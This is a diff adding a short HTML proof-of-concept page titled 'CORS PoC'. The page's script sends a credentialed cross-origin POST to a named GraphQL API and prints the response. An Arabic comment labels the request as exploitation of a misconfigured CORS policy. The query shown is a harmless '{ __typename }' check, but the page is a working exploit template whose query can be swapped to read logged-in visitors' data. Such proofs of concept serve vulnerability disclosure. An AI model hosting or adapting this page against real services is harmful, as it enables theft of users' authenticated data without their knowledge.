@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC</title>
+</head>
+<body>
+<script>
+fetch("https://api.vault.chiatest.net/graphql", {
+    method: "POST",
+    credentials: "include", // استغلال misconfigured CORS
+    headers: {
+        "Content-Type": "application/json",
+        "x-apollo-operation-name": "dummy"
+    },
+    body: JSON.stringify({
+        query: "{ __typename }" // استعلام آمن جداً فقط للتحقق
+    })
+})
+.then(res => res.text())
+.then(data => {
+    console.log("✅ Response from server:");
+    console.log(data);
+})
+.catch(err => console.error("❌ Error:", err));
+</script>
+</body>
+</html>
